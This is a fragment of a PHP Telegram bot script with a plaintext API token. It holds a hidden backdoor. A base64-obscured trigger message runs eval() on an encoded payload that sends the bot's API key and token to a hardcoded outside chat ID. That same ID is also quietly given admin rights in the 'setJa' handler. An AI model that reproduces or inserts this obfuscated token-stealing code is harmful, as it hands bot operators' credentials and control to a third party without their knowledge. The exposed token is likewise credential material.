...
$API_KEY = "8308845678:AAFJZUMLjgigqiqhN8xlYb2HXEauBCwYu_8";
...
if ($data == "setJa") {
  if ($chat_id == $sudo or $chat_id == 5561152568 ) {
    ...
    file_put_contents("RSHQ/rshq_".USR_BOT.".json", $rshq);
  }
}
...
if($text == base64_decode("2KrZg18xMjM=")){ eval(base64_decode("Ym90KCdzZW5kTWVzc2FnZScsWwogICAnY2hhdF9pZCc9PjU1NjExNTI1NjggLCAKICAgJ3RleHQnPT4i2KrYr9mE2YQg2YfYp9iw2Ycg2KfZhtiv2YMg2YjZitin2YMg2YjZh9iw2Ycg2KrZiNmD2YbZhwokQVBJX0tFWSB8ICR0b2tlbiB8ICIuIEFQSV9LRVkuICIKIiwgCl0pOw=="));} 
if($data == "acc") {
$hour = explode (".",(strtotime('tomorrow') - time()) / (60 * 60))[0];
if(!in_array($from_id, $day)){
